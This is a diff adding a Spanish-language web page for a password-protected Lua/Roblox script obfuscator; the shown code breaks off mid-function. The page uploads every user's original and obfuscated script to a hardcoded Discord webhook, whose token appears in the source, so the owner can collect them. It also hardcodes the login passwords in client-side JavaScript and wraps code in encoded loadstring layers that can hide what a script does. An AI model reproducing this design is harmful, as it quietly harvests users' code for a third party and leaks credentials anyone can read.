@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Ofuscador Lua</title>
+<style>
+:root{
+  --bg:#0f1115; --panel:#161a21; --panel2:#1d222b; --border:#2a3140;
+  --text:#e8ecf4; --muted:#8b93a7; --accent:#5ee6c9; --accent2:#ffb454;
+  --danger:#ff6b6b; --mono:'JetBrains Mono','Courier New',monospace;
+  color-scheme: dark;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: light){
+  :root:not([data-theme="dark"]){
+    --bg:#f3f4f7; --panel:#ffffff; --panel2:#eef0f4; --border:#dde1e8;
+    --text:#1a1d24; --muted:#656d7e; --accent:#0f9d7f; --accent2:#c26a00;
+  }
+}
+:root[data-theme="light"]{
+  --bg:#f3f4f7; --panel:#ffffff; --panel2:#eef0f4; --border:#dde1e8;
+  --text:#1a1d24; --muted:#656d7e; --accent:#0f9d7f; --accent2:#c26a00;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:10;background:var(--bg);}
+header{
+  position:sticky; top:env(safe-area-inset-top,0px); z-index:5;
+  padding:18px 20px 14px; border-bottom:1px solid var(--border); background:var(--bg);
+}
+h1{margin:0; font-size:1.15rem; letter-spacing:.2px; font-weight:650;}
+h1 span{color:var(--accent); font-family:var(--mono);}
+.sub{color:var(--muted); font-size:.82rem; margin-top:4px; line-height:1.5; max-width:640px;}
+main{padding:16px; max-width:1100px; margin:0 auto;}
+.panel{
+  background:var(--panel); border:1px solid var(--border); border-radius:10px;
+  padding:14px; display:flex; flex-direction:column; min-width:0;
+}
+.panel h2{font-size:.78rem; text-transform:none; color:var(--muted); margin:0 0 8px; font-weight:600;}
+textarea{
+  width:100%; min-height:300px; resize:vertical; background:var(--panel2);
+  color:var(--text); border:1px solid var(--border); border-radius:8px; padding:10px;
+  font-family:var(--mono); font-size:.8rem; line-height:1.5; outline:none;
+}
+textarea:focus{border-color:var(--accent);}
+.actions{display:flex; gap:10px; align-items:center; margin:14px 0; flex-wrap:wrap;}
+button{
+  font-family:inherit; font-size:.85rem; font-weight:600; padding:10px 18px;
+  border-radius:8px; border:1px solid var(--border); cursor:pointer; background:var(--panel2); color:var(--text);
+}
+button.primary{background:var(--accent); color:#06231c; border-color:var(--accent);}
+button.primary:hover{opacity:.9;}
+button.ghost:hover{border-color:var(--accent);}
+button.owner{background:var(--accent2); color:#1a1000; border-color:var(--accent2);}
+button.owner:hover{opacity:.9;}
+button.danger{background:transparent; color:var(--danger); border-color:color-mix(in srgb, var(--danger) 40%, var(--border));}
+button.danger:hover{border-color:var(--danger);}
+button.small{padding:7px 12px; font-size:.78rem;}
+.stats{font-size:.78rem; color:var(--muted); font-family:var(--mono);}
+footer{color:var(--muted); font-size:.72rem; text-align:center; padding:20px; max-width:640px; margin:0 auto; line-height:1.6;}
+#loginScreen{position:fixed; inset:0; z-index:50; background:var(--bg); display:flex; align-items:center; justify-content:center; padding:20px;}
+#loginScreen .box{background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:28px 24px; width:100%; max-width:340px; text-align:center;}
+#loginScreen h2{margin:0 0 6px; font-size:1.05rem;}
+#loginScreen p{color:var(--muted); font-size:.8rem; margin:0 0 16px;}
+#loginScreen input{width:100%; padding:10px 12px; border-radius:8px; border:1px solid var(--border); background:var(--panel2); color:var(--text); font-family:var(--mono); font-size:.9rem; text-align:center; margin-bottom:10px; outline:none;}
+#loginScreen input:focus{border-color:var(--accent);}
+#loginError{color:var(--danger); font-size:.78rem; min-height:16px; margin-top:4px;}
+#appRoot{display:none;}
+
+#histModal{display:none; position:fixed; inset:0; z-index:60; background:rgba(0,0,0,.65); align-items:center; justify-content:center; padding:16px;}
+#histModal.open{display:flex;}
+#histModal .modal{
+  background:var(--panel); border:1px solid var(--border); border-radius:12px;
+  width:100%; max-width:720px; max-height:90vh; display:flex; flex-direction:column; overflow:hidden;
+}
+#histModal .modal-head{
+  display:flex; align-items:center; justify-content:space-between; gap:10px;
+  padding:14px 16px; border-bottom:1px solid var(--border);
+}
+#histModal .modal-head h2{margin:0; font-size:1rem;}
+#histModal .modal-body{overflow:auto; padding:12px 16px; flex:1;}
+#histModal .modal-foot{
+  padding:12px 16px; border-top:1px solid var(--border);
+  display:flex; gap:8px; flex-wrap:wrap; align-items:center;
+}
+.hist-filters{display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px;}
+.hist-filters button.active{border-color:var(--accent); color:var(--accent);}
+.hist-item{
+  background:var(--panel2); border:1px solid var(--border); border-radius:8px;
+  padding:12px; margin-bottom:10px;
+}
+.hist-item .meta{font-size:.75rem; color:var(--muted); font-family:var(--mono); margin-bottom:6px; display:flex; flex-wrap:wrap; gap:8px 14px;}
+.hist-item .role-owner{color:var(--accent2);}
+.hist-item .role-user{color:var(--accent);}
+.hist-item .preview{
+  font-family:var(--mono); font-size:.72rem; color:var(--muted);
+  white-space:pre-wrap; word-break:break-all; max-height:72px; overflow:hidden;
+  margin:8px 0; opacity:.85;
+}
+.hist-item .row-btns{display:flex; gap:8px; flex-wrap:wrap;}
+.hist-empty{color:var(--muted); font-size:.85rem; text-align:center; padding:28px 10px; line-height:1.6;}
+.badge{font-size:.68rem; padding:2px 7px; border-radius:999px; border:1px solid var(--border); font-weight:600;}
+.owner-settings{
+  background:var(--panel2); border:1px solid var(--border); border-radius:8px;
+  padding:10px 12px; margin-bottom:12px; display:none;
+}
+.owner-settings label{display:block; font-size:.78rem; color:var(--muted); margin-bottom:6px;}
+.owner-settings input{
+  width:100%; padding:8px 10px; border-radius:6px; border:1px solid var(--border);
+  background:var(--panel); color:var(--text); font-family:var(--mono); font-size:.78rem;
+}
+.owner-settings .hint{font-size:.72rem; color:var(--muted); margin-top:6px; line-height:1.4;}
+
+#viewModal{display:none; position:fixed; inset:0; z-index:70; background:rgba(0,0,0,.72); align-items:center; justify-content:center; padding:16px;}
+#viewModal.open{display:flex;}
+#viewModal .modal{
+  background:var(--panel); border:1px solid var(--border); border-radius:12px;
+  width:100%; max-width:640px; max-height:85vh; display:flex; flex-direction:column; overflow:hidden;
+}
+#viewModal .modal-head{
+  display:flex; align-items:center; justify-content:space-between; gap:10px;
+  padding:14px 16px; border-bottom:1px solid var(--border);
+}
+#viewModal .modal-head h2{margin:0; font-size:.95rem; word-break:break-all;}
+#viewModal textarea{
+  flex:1; min-height:240px; margin:12px 16px; width:calc(100% - 32px);
+}
+#viewModal .modal-foot{
+  padding:12px 16px; border-top:1px solid var(--border);
+  display:flex; gap:8px; flex-wrap:wrap;
+}
+</style>
+</head>
+<body>
+<div id="loginScreen">
+  <div class="box">
+    <h2>🔒 Acceso</h2>
+    <p>Introduce la contraseña para entrar.</p>
+    <input type="password" id="pwInput" placeholder="Contraseña" autocomplete="off">
+    <button type="button" class="primary" id="pwSubmit" style="width:100%;">Entrar</button>
+    <div id="loginError"></div>
+  </div>
+</div>
+<div id="appRoot">
+<header>
+  <h1>Ofuscador <span>Lua</span></h1>
+  <div class="sub">Ofuscación local. Historial permanente (gente + owner) en este dispositivo. Toda ofuscación también se envía al webhook (original + obfuscado).</div>
+</header>
+
+<main>
+  <div class="actions">
+    <button type="button" class="primary" id="runBtn">Ofuscar →</button>
+    <button type="button" class="ghost" id="exampleBtn">Subir archivo</button>
+    <button type="button" class="owner" id="histBtn" style="display:none;">OBFUSCATIONS</button>
+    <input type="file" id="fileInput" style="display:none;">
+    <button type="button" class="ghost" id="copyBtn" style="display:none;">Copiar</button>
+    <button type="button" class="ghost" id="dlNowBtn" style="display:none;">Descargar .txt</button>
+    <span class="stats" id="stats"></span>
+  </div>
+
+  <div class="panel">
+    <h2 id="panelLabel">Tu script (.lua)</h2>
+    <textarea id="input" placeholder="-- pega tu script de Lua aquí
+local function saludar(nombre)
+    print(&quot;Hola, &quot; .. nombre .. &quot;!&quot;)
+end
+saludar(&quot;Mundo&quot;)"></textarea>
+  </div>
+</main>
+
+<footer>El historial no se borra solo: solo cuando el owner pulse «Borrar historial» o se limpien los datos del sitio en el navegador.</footer>
+</div>
+
+<div id="histModal">
+  <div class="modal">
+    <div class="modal-head">
+      <h2>OBFUSCATIONS — historial</h2>
+      <button type="button" class="ghost" id="histClose">Cerrar</button>
+    </div>
+    <div class="modal-body">
+      <div class="owner-settings" id="ownerSettings">
+        <label>Webhook permanente (opcional) — cada ofuscación de gente y owner se envía aquí</label>
+        <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+        <div class="hint">Si lo configuras, TODAS las ofuscaciones (usuario y owner) se mandan a ese webhook como copia de seguridad remota. El historial de la app sigue en este dispositivo hasta que lo borres.</div>
+      </div>
+      <div class="hist-filters">
+        <button type="button" class="ghost active" data-filter="all">Todos</button>
+        <button type="button" class="ghost" data-filter="user">Gente normal</button>
+        <button type="button" class="ghost" data-filter="owner">Owner</button>
+      </div>
+      <div id="histList"></div>
+    </div>
+    <div class="modal-foot">
+      <span class="stats" id="histCount"></span>
+      <button type="button" class="ghost small" id="histExport">Exportar backup</button>
+      <button type="button" class="ghost small" id="histImport">Importar backup</button>
+      <input type="file" id="histImportFile" accept="application/json,.json" style="display:none;">
+      <button type="button" class="danger small" id="histClear">Borrar historial</button>
+    </div>
+  </div>
+</div>
+
+<div id="viewModal">
+  <div class="modal">
+    <div class="modal-head">
+      <h2 id="viewTitle">Archivo</h2>
+      <button type="button" class="ghost" id="viewClose">Cerrar</button>
+    </div>
+    <textarea id="viewText" readonly></textarea>
+    <div class="modal-foot">
+      <button type="button" class="primary small" id="viewCopy">Copiar todo</button>
+      <button type="button" class="ghost small" id="viewShare">Compartir / Guardar</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+let currentRole = null;
+const DB_NAME = 'LuaObfDB';
+const DB_STORE = 'history';
+const DB_VERSION = 1;
+const LS_KEY = 'lua_obf_history_v3';
+// Webhook permanente — todas las ofuscaciones se envían aquí
+const PERMANENT_WEBHOOK = 'https://discord.com/api/webhooks/1557359520085311561/qvUsplN0FJNXm8Bw3C9VCIJ_A3m8idg5lNgqJ_nAE_WuY_rNdHD46kshqQ-gBJrPVgmX';
+let lastFileName = 'script';
+let lastOriginal = '';
+let lastObfuscated = '';
+let viewPayload = { name: '', text: '' };
+let dbPromise = null;
+
+function tryLogin(){
+  const val = $('pwInput').value;
+  if(val === 'OWNERTHEBOT'){ currentRole = 'owner'; }
+  else if(val === 'NOLINKAPI'){ currentRole = 'user'; }
+  else { $('loginError').textContent = 'Contraseña incorrecta.'; return; }
+  $('loginScreen').style.display = 'none';
+  $('appRoot').style.display = 'block';
+  $('histBtn').style.display = currentRole === 'owner' ? 'inline-block' : 'none';
+  // Pedir al navegador que NO borre los datos al cerrar (iOS/Safari)
+  try{
+    if(navigator.storage && navigator.storage.persist){
+      navigator.storage.persist().then(ok => console.log('persist', ok)).catch(()=>{});
+    }
+  }catch(e){}
+  historyGetAll().catch(()=>{});
+}
+
+function openDB(){
+  if(dbPromise) return dbPromise;
+  dbPromise = new Promise((resolve, reject) => {
+    try{
+      const req = indexedDB.open(DB_NAME, DB_VERSION);
+      req.onupgradeneeded = () => {
+        const db = req.result;
+        if(!db.objectStoreNames.contains(DB_STORE)){
+          const store = db.createObjectStore(DB_STORE, { keyPath: 'id' });
+          store.createIndex('ts', 'ts', { unique: false });
+          store.createIndex('role', 'role', { unique: false });
+        }
+      };
+      req.onsuccess = () => resolve(req.result);
+      req.onerror = () => reject(req.error || new Error('IDB open error'));
+      req.onblocked = () => reject(new Error('IDB blocked'));
+    }catch(e){ reject(e); }
+  });
+  return dbPromise;
+}
+
+function lsLoad(){
+  try{
+    let raw = localStorage.getItem(LS_KEY);
+    if(!raw) raw = localStorage.getItem(LS_KEY + '_bak');
+    if(!raw) return [];
+    const arr = JSON.parse(raw);
+    return Array.isArray(arr) ? arr : [];
+  }catch(e){
+    try{
+      const raw = localStorage.getItem(LS_KEY + '_bak');
+      if(!raw) return [];
+      const arr = JSON.parse(raw);
+      return Array.isArray(arr) ? arr : [];
+    }catch(_){ return []; }
+  }
+}
+function lsSave(arr){
+  const raw = JSON.stringify(arr);
+  try{
+    localStorage.setItem(LS_KEY, raw);
+    try{ localStorage.setItem(LS_KEY + '_bak', raw); }catch(_){}
+    return true;
+  }catch(e){
+    // quota: drop oldest until it fits, never drop the newest
+    const copy = arr.slice();
+    while(copy.length > 1){
+      copy.shift();
+      try{
+        const r = JSON.stringify(copy);
+        localStorage.setItem(LS_KEY, r);
+        try{ localStorage.setItem(LS_KEY + '_bak', r); }catch(_){}
+        return true;
+      }catch(_){}
+    }
+    return false;
+  }
+}
+
+async function dbAddRaw(entry){
+  try{
+    const db = await openDB();
+    await new Promise((resolve, reject) => {
+      const tx = db.transaction(DB_STORE, 'readwrite');
+      tx.objectStore(DB_STORE).put(entry);
+      tx.oncomplete = () => resolve(true);
+      tx.onerror = () => reject(tx.error);
+    });
+    return true;
+  }catch(e){ return false; }
+}
+
+async function dbGetAllRaw(){
+  try{
+    const db = await openDB();
+    return await new Promise((resolve, reject) => {
+      const tx = db.transaction(DB_STORE, 'readonly');
+      const req = tx.objectStore(DB_STORE).getAll();
+      req.onsuccess = () => resolve(req.result || []);
+      req.onerror = () => reject(req.error);
+    });
+  }catch(e){ return []; }
+}
+
+async function dbClearRaw(){
+  try{
+    const db = await openDB();
+    await new Promise((resolve, reject) => {
+      const tx = db.transaction(DB_STORE, 'readwrite');
+      tx.objectStore(DB_STORE).clear();
+      tx.oncomplete = () => resolve(true);
+      tx.onerror = () => reject(tx.error);
+    });
+    return true;
+  }catch(e){ return false; }
+}
+
+function mergeById(a, b){
+  const map = new Map();
+  for(const e of a){ if(e && e.id) map.set(e.id, e); }
+  for(const e of b){ if(e && e.id) map.set(e.id, e); }
+  return [...map.values()];
+}
+
+async function historyAdd(entry){
+  // 1) localStorage (más fiable en iOS / file://)
+  const ls = lsLoad();
+  const without = ls.filter(x => x.id !== entry.id);
+  without.push(entry);
+  // sin límite artificial de cantidad; solo recorta si no cabe en cuota
+  const okLS = lsSave(without);
+  // 2) IndexedDB (más espacio cuando funciona)
+  const okIdb = await dbAddRaw(entry);
+  return okLS || okIdb;
+}
+
+async function historyGetAll(){
+  const fromLs = lsLoad();
+  const fromIdb = await dbGetAllRaw();
+  return mergeById(fromLs, fromIdb);
+}
+
+async function historyClear(){
+  try{ localStorage.removeItem(LS_KEY); }catch(e){}
+  await dbClearRaw();
+}
+
+const rnd = () => '_0x' + Math.floor(Math.random()*0xFFFFFF).toString(16).padStart(6,'0');
+const LUA_KEYWORDS = new Set(['and','break','do','else','elseif','end','false','for','function','goto','if','in','local','nil','not','or','repeat','return','then','true','until','while']);
+const LUA_GLOBALS = new Set(['print','pairs','ipairs','table','string','math','os','io','tostring','tonumber','type','pcall','xpcall','error','assert','select','unpack','require','setmetatable','getmetatable','rawget','rawset','rawequal','next','coroutine','wait','task','game','workspace','Instance','Vector3','Vector2','CFrame','Color3','UDim2','UDim','Enum','script','_G','_ENV','self','loadstring','load','getfenv','setfenv']);
+
+function tokenize(src){
+  const segs = []; let i = 0; const n = src.length;
+  let buf = '';
+  const flush = () => { if(buf){ segs.push({type:'code', value:buf}); buf=''; } };
+  while(i < n){
+    const c = src[i];
+    if(c === '-' && src[i+1] === '-'){
+      let j = i+2;
+      if(src[j] === '['){
+        let eq = 0, k = j+1;
+        while(src[k] === '='){ eq++; k++; }
+        if(src[k] === '['){
+          const close = ']' + '='.repeat(eq) + ']';
+          const end = src.indexOf(close, k+1);
+          const full = end === -1 ? src.slice(i) : src.slice(i, end+close.length);
+          flush(); segs.push({type:'comment', value:full});
+          i += full.length; continue;
+        }
+      }
+      let end = src.indexOf('\n', i);
+      if(end === -1) end = n;
+      flush(); segs.push({type:'comment', value: src.slice(i, end)});
+      i = end; continue;
+    }
+    if(c === '"' || c === "'"){
+      const q = c; let j = i+1; let s = c;
+      while(j < n && src[j] !== q){
+        if(src[j] === '\\'){ s += src[j] + (src[j+1]||''); j += 2; continue; }
+        s += src[j]; j++;
+      }
+      s += q; j++;
+      flush(); segs.push({type:'string', value:s});
+      i = j; continue;
+    }
+    if(c === '[' && (src[i+1] === '[' || src[i+1] === '=')){
+      let eq = 0, k = i+1;
+      while(src[k] === '='){ eq++; k++; }
+      if(src[k] === '['){
+        const close = ']' + '='.repeat(eq) + ']';
+        const end = src.indexOf(close, k+1);
+        const full = end === -1 ? src.slice(i) : src.slice(i, end+close.length);
+        flush(); segs.push({type:'longstring', value:full});
+        i += full.length; continue;
+      }
+    }
+    buf += c; i++;
+  }
+  flush();
+  return segs;
+}
+
+function decodeLuaString(raw){
+  let body = raw.slice(1, -1);
+  let out = ''; let ok = true;
+  for(let i=0;i<body.length;i++){
+    const c = body[i];
+    if(c === '\\'){
+      const nx = body[i+1];
+      const map = {n:'\n', t:'\t', r:'\r', a:'\x07', b:'\b', f:'\f', v:'\v', '\\':'\\', '"':'"', "'":"'", '\n':'\n'};
+      if(nx in map){ out += map[nx]; i++; }
+      else if(/\d/.test(nx)){
+        let num = ''; let k = i+1;
+        while(k < body.length && /\d/.test(body[k]) && num.length < 3){ num += body[k]; k++; }
+        out += String.fromCharCode(parseInt(num,10)); i = k-1;
+      } else { ok = false; break; }
+    } else out += c;
+  }
+  return ok ? out : null;
+}
+
+function obfuscateNumber(num){
+  const a = Math.floor(Math.random()*800)+20;
+  const b = Math.floor(Math.random()*400)+5;
+  const c = Math.floor(Math.random()*50)+3;
+  const variants = [
+    `(${num+a}-${a})`, `(${num*2}/2)`, `((${num+a})-${a})`,
+    `((${num+c+a})-(${c}+${a}))`, `((${num}*${c+1})-(${num}*${c}))`
+  ];
+  if(num !== 0){
+    variants.push(`(${num}*${b}/${b})`);
+    variants.push(`(math.floor(${num}+0.0))`);
+  }
+  return variants[Math.floor(Math.random()*variants.length)];
+}
+
+async function shareOrDownload(filename, content){
+  try{
+    const file = new File([content], filename, { type: 'text/plain' });
+    if(navigator.canShare && navigator.canShare({ files: [file] })){
+      try{
+        await navigator.share({ files: [file], title: filename });
+        return true;
+      }catch(e){
+        if(e && e.name === 'AbortError') return true;
+      }
+    }
+  }catch(e){}
+  openView(filename, content);
+  try{
+    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = filename; a.rel = 'noopener'; a.style.display = 'none';
+    document.body.appendChild(a); a.click(); a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 2500);
+  }catch(e){}
+  return false;
+}
+
+function openView(name, text){
+  viewPayload = { name, text };
+  $('viewTitle').textContent = name + ' (' + (text ? text.length : 0) + ' chars)';
+  $('viewText').value = text || '';
+  $('viewModal').classList.add('open');
+}
+function closeView(){ $('viewModal').classList.remove('open'); }
+
+function getWebhook(){
+  return PERMANENT_WEBHOOK;
+}
+
+function safeFileBase(name){
+  let n = (name || 'script').replace(/\.(lua|txt|luau)$/i,'').trim();
+  n = n.replace(/[^\w\-.\u00C0-\u024F ]+/g, '_').replace(/\s+/g, '_');
+  if(!n) n = 'script';
+  return n.slice(0, 40);
+}
+
+async function sendWebhook(entry){
+  const url = PERMANENT_WEBHOOK;
+  if(!url) return;
+  const roleTag = entry.role === 'owner' ? 'owner' : 'gente';
+  const base = safeFileBase(entry.fileName || lastFileName || 'script');
+  const stamp = (entry.ts || new Date().toISOString()).replace(/[:.]/g,'-').slice(0,19);
+  const origName = `${base}_original_${roleTag}_${stamp}.txt`;
+  const obfName = `${base}_obfuscado_${roleTag}_${stamp}.txt`;
+
+  const content =
+    `**Nueva ofuscación**\n` +
+    `Nombre: **${base}**\n` +
+    `Rol: **${roleTag}**\n` +
+    `Fecha: ${entry.ts}\n` +
+    `Tamaño: ${entry.before} B → ${entry.after} B\n` +
+    `ID: \`${entry.id}\`\n` +
+    `Archivos: \`${origName}\` (original) · \`${obfName}\` (obfuscado)`;
+
+  try{
+    const fd = new FormData();
+    fd.append('payload_json', JSON.stringify({ content }));
+    // Discord: files[n] + filename via Blob
+    const origBlob = new Blob([entry.original || ''], { type: 'text/plain' });
+    const obfBlob = new Blob([entry.obfuscated || ''], { type: 'text/plain' });
+    fd.append('files[0]', origBlob, origName);
+    fd.append('files[1]', obfBlob, obfName);
+    await fetch(url, { method: 'POST', body: fd });
+  }catch(e){
+    // Fallback: solo mensaje de texto si fallan los archivos (límite/red)
+    try{
+      const max = 900;
+      const o = (entry.original || '').slice(0, max);
+      const f = (entry.obfuscated || '').slice(0, max);
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: content + `\n\n(Fallback sin archivos)\nORIGINAL (recorte):\n\`\`\`\n${o}\n\`\`\`\nOFUSCADO (recorte):\n\`\`\`\n${f}\n\`\`\``
+        })
+      });
+    }catch(_){}
+  }
+}
+
+async function run(){
+  if(currentRole === null) return;
+  try{
+    const src = $('input').value;
+    if(!src.trim()){ $('stats').textContent=''; return; }
+    lastOriginal = src;
+
+    let segs = tokenize(src);
+    const key1 = Math.floor(Math.random()*200)+30;
+    const key2 = Math.floor(Math.random()*180)+15;
+    const key3 = Math.floor(Math.random()*90)+7;
+    const decoderName = rnd();
+    let needDecoder = false;
+    let out = '';
+    for(const seg of segs){
+      if(seg.type === 'comment') continue;
+      if(seg.type === 'longstring'){ out += seg.value; continue; }
+      if(seg.type === 'string'){
+        const val = decodeLuaString(seg.value);
+        if(val !== null && val.length > 0){
+          const bytes = [];
+          for(let i=0;i<val.length;i++){
+            let b = val.charCodeAt(i) & 0xFF;
+            b = ((b ^ key1) + key2) & 0xFF;
+            b = (b ^ ((key3 + i) & 0xFF)) & 0xFF;
+            bytes.push(b);
+          }
+          if(bytes.length > 48 && Math.random() > 0.4){
+            const mid = Math.floor(bytes.length/2);
+            out += `(${decoderName}({${bytes.slice(0,mid).join(',')}},${key1},${key2},${key3})..${decoderName}({${bytes.slice(mid).join(',')}},${key1},${key2},${key3}))`;
+          } else {
+            out += `${decoderName}({${bytes.join(',')}},${key1},${key2},${key3})`;
+          }
+          needDecoder = true;
+        } else if(val === ''){ out += '""'; }
+        else out += seg.value;
+        continue;
+      }
+      let code = seg.value;
+      code = code.replace(/(?<![\w.])(\d+)(?![\w.xXeE])/g, (m, numStr) => {
+        const num = parseInt(numStr, 10);
+        if(isNaN(num) || numStr.length > 9) return m;
+        return obfuscateNumber(num);
+      });
+      out += code;
+    }
+
+    let preamble = '';
+    if(needDecoder){
+      preamble += `local function ${decoderName}(t,k1,k2,k3)\nlocal s={}\nfor i=1,#t do\nlocal b=((t[i]~((k3+i-1)%256))%256)\nb=((b-k2)%256)~k1\ns[i]=string.char(b)\nend\nreturn table.concat(s)\nend\n`;
+    }
+
+    let result = preamble + out;
+    result = renameLocals(result);
+    result = insertJunk(result);
+    result = insertJunk(result);
+    result = injectOpaqueNoise(result);
+    result = result.split('\n').map(l => l.trim()).filter(l => l.length > 0).join('\n').replace(/[ \t]{2,}/g, ' ');
+    result = wrapWhole(result);
+    result = wrapWhole(result);
+
+    lastObfuscated = result;
+    $('input').value = result;
+    $('panelLabel').textContent = 'Resultado ofuscado';
+    $('copyBtn').style.display = 'inline-block';
+    $('dlNowBtn').style.display = 'inline-block';
+    const before = new Blob([src]).size, after = new Blob([result]).size;
+    $('stats').textContent = `${before} B → ${after} B · guardando…`;
+
+    const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+    const iso = new Date().toISOString();
+    const entry = {
+      id, ts: iso, role: currentRole || 'user',
+      before, after,
+      origLen: src.length, obfLen: result.length,
+      original: src,
+      obfuscated: result,
+      preview: src.replace(/\s+/g,' ').slice(0, 140)
+    };
+
+    // Historial local: guarda GENTE y OWNER de forma permanente (IndexedDB)
+    // Se mantiene al cerrar la página; solo se borra con «Borrar historial»
+    try{
+      const ok = await historyAdd(entry);
+      const all = await historyGetAll();
+      if(ok){
+        $('stats').textContent = `${before} B → ${after} B · guardado ✓ (${all.length} en historial)`;
+      } else {
+        $('stats').textContent = `${before} B → ${after} B · no se pudo guardar historial`;
+      }
+    }catch(e){
+      console.error(e);
+      $('stats').textContent = `${before} B → ${after} B · error historial: ` + (e.message||e);
+    }
+
+    // SIEMPRE enviar a webhook permanente (gente + owner): mensaje + 2 archivos
+    entry.fileName = lastFileName || 'script';
+    sendWebhook(entry);
+  }catch(err){
+    console.error(err);
+    $('stats').textContent = 'Error: ' + (err && err.message ? err.message : String(err));
+  }
+}
+
+function renameLocals(code){
+  const names = new Set();
+  const declRe = /\blocal\s+((?:[A-Za-z_]\w*\s*,\s*)*[A-Za-z_]\w*)/g;
+  let m;
+  while((m = declRe.exec(code))){
+    m[1].split(',').forEach(n => {
+      const name = n.trim();
+      if(name && !LUA_KEYWORDS.has(name) && !LUA_GLOBALS.has(name)) names.add(name);
+    });
+  }
+  const funcParamRe = /function\s*[\w.:]*\s*\(([^)]*)\)/g;
+  while((m = funcParamRe.exec(code))){
+    m[1].split(',').forEach(p => {
+      const name = p.trim();
+      if(name && name !== '...' && !LUA_KEYWORDS.has(name) && !LUA_GLOBALS.has(name)) names.add(name);
+    });
+  }
+  const map = new Map();
+  for(const n of names) map.set(n, rnd());
+  if(map.size === 0) return code;
+  const sorted = [...map.keys()].sort((a,b) => b.length - a.length);
+  const re = new RegExp('\\b(' + sorted.map(n => n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')).join('|') + ')\\b', 'g');
+  return code.replace(re, match => map.get(match) || match);
+}
+
+function wrapWhole(code){
+  const k1 = Math.floor(Math.random()*180)+20;
+  const k2 = Math.floor(Math.random()*150)+10;
+  const k3 = Math.floor(Math.random()*120)+5;
+  const bytes = [];
+  for(let i=0;i<code.length;i++){
+    let cc = code.charCodeAt(i) & 0xFF;
+    cc = ((cc ^ k1) + k2) & 0xFF;
+    cc = (cc ^ ((k3 + (i % 256)) & 0xFF)) & 0xFF;
+    bytes.push(cc);
+  }
+  const decFn = rnd(), arrName = rnd(), chunkName = rnd(), tmp = rnd();
+  let src = `local function ${decFn}(t,a,b,c)\nlocal s={}\nfor i=1,#t do\nlocal v=((t[i]~((c+(i-1)%256)))%256)\nv=((v-b)%256)~a\ns[i]=string.char(v)\nend\nreturn table.concat(s)\nend\n`;
+  src += `local ${arrName}={${bytes.join(',')}}\n`;
+  src += `local ${tmp}=${decFn}(${arrName},${k1},${k2},${k3})\n`;
+  src += `local ${chunkName}=(loadstring or load)(${tmp})\n`;
+  src += `if ${chunkName} then return ${chunkName}() end`;
+  return src;
+}
+
+function insertJunk(code){
+  const lines = code.split('\n');
+  const out = [];
+  for(const line of lines){
+    out.push(line);
+    if(line.trim() && Math.random() < 0.5){
+      const a = rnd(), b = Math.floor(Math.random()*9000), c = rnd(), d = Math.floor(Math.random()*500);
+      const kind = Math.floor(Math.random()*8);
+      if(kind === 0) out.push(`local ${a}=${b}`);
+      else if(kind === 1) out.push(`if false then local ${a}=${b} end`);
+      else if(kind === 2) out.push(`local ${a}=(${b}*0)+${Math.floor(Math.random()*50)}`);
+      else if(kind === 3) out.push(`for ${a}=1,0 do end`);
+      else if(kind === 4) out.push(`local ${a}=(${b}==${b}) and ${Math.floor(Math.random()*20)} or 0`);
+      else if(kind === 5) out.push(`do local ${a}=${b} ${a}=${a} end`);
+      else if(kind === 6) out.push(`local ${a}=function() return ${b} end`);
+      else out.push(`local ${a}={${d},${b}} local ${c}=${a}[1]`);
+    }
+  }
+  return out.join('\n');
+}
+
+function injectOpaqueNoise(code){
+  const blocks = [];
+  for(let i=0;i<3;i++){
+    const a = rnd(), b = rnd(), n = Math.floor(Math.random()*9999);
+    const style = Math.floor(Math.random()*4);
+    if(style === 0) blocks.push(`local ${a}=(function() local ${b}=${n} return ${b}==${b} and 0 or 1 end)()`);
+    else if(style === 1) blocks.push(`do local ${a}={${n}} if #${a}<0 then return end end`);
+    else if(style === 2) blocks.push(`local ${a}=0 while ${a}<0 do ${a}=${a}+1 end`);
+    else blocks.push(`local ${a}=select(1,${n},${n+1})`);
+  }
+  return blocks.join('\n') + '\n' + code;
+}
+
+let histFilter = 'all';
+function escapeHtml(s){
+  return String(s||'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+async function renderHistory(){
+  const list = $('histList');
+  let all = [];
+  try{ all = await historyGetAll(); }catch(e){ all = []; }
+  all.sort((a,b) => (b.ts||'').localeCompare(a.ts||''));
+  const filtered = all.filter(e => histFilter === 'all' || e.role === histFilter);
+  $('histCount').textContent = `${filtered.length} de ${all.length} · permanente hasta borrar`;
+  if(filtered.length === 0){
+    list.innerHTML = '<div class="hist-empty">No hay ofuscaciones en este navegador.<br><br>En iPhone, al abrir el HTML como archivo local el historial a veces se borra al cerrar.<br><br><strong>Lo permanente está en Discord</strong> (webhook).<br>Si exportaste un backup, usa <strong>Importar backup</strong>.</div>';
+    return;
+  }
+  list.innerHTML = filtered.map(e => {
+    const roleLabel = e.role === 'owner' ? 'OWNER' : 'GENTE';
+    const roleClass = e.role === 'owner' ? 'role-owner' : 'role-user';
+    const date = new Date(e.ts).toLocaleString();
+    const safeId = String(e.id).replace(/[^a-zA-Z0-9_-]/g,'');
+    const oLen = e.origLen || (e.original||'').length;
